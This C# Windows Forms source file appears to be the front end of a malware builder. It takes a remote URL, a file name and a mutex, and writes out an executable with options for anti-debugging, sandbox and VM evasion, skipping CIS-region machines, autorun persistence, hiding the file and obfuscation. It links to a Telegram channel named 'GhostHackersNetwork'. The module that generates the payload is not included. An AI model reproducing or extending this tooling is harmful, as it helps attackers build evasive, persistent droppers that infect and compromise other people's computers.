using MaterialSkin;
using MaterialSkin.Controls;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

namespace Builder
{
    public partial class Form1 : MaterialForm
    {
        public Form1()
        {
            InitializeComponent();
            var materialSkinManager = MaterialSkinManager.Instance;
            materialSkinManager.AddFormToManage(this);
            materialSkinManager.Theme = MaterialSkinManager.Themes.DARK;
            materialSkinManager.ColorScheme = new ColorScheme(Primary.Blue400, Primary.LightBlue900, Primary.BlueGrey500, Accent.Cyan700, TextShade.WHITE);
        }

        private void BuildBtn_Click(object sender, System.EventArgs e)
        {
            string Url = RemoteUrl_Box.Text;
            string FileName = FileName_Box.Text;
            string MutexValue = Mutex_Box.Text;

            bool MutexBool = MutexControl_Box.Checked;
            bool AntiDebug = AntiDebugBox.Checked;
            bool AntiAnyRun = AntiAnyRun_Box.Checked;
            bool AntiVM = AntiVM_Box.Checked;
            bool AntiCIS = AntiCis_Box.Checked;
            bool Autorun = Autorun_Box.Checked;
            bool HideFile = HideFile_Box.Checked;
            bool Obfuscate = Obfuscate_Box.Checked;

            if (string.IsNullOrEmpty(Url) || string.IsNullOrEmpty(FileName) || (MutexBool && string.IsNullOrEmpty(MutexValue)))
            {
                MessageBox.Show("Forms cannot be empty!", "~Information", MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            using (SaveFileDialog saveFile = new SaveFileDialog())
            {
                saveFile.Title = "Save Build :D";
                saveFile.Filter = "Exe Files (*.exe)|*.exe";
                if (saveFile.ShowDialog() == DialogResult.OK)
                {
                    string result = Modules.Builder.Execute(saveFile.FileName, Url, FileName, MutexValue, MutexBool, AntiDebug, AntiAnyRun, AntiVM, AntiCIS, Autorun, HideFile, Obfuscate);
                    MessageBox.Show($"Result: {result}", "! Information !", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        }

        private void MutexControl_Box_CheckedChanged(object sender, System.EventArgs e)
        {
            if (MutexControl_Box.Checked)
            {
                Mutex_Box.Enabled = true;
            }
            else
            {
                Mutex_Box.Enabled = false;
            }
        }

        private void pictureBox2_Click(object sender, System.EventArgs e)
        {
            Process.Start("https://t.me/GhostHackersNetwork");
        }

        private void Form1_Load(object sender, System.EventArgs e)
        {

        }

        private void label2_Click(object sender, System.EventArgs e)
        {

        }
    }
}
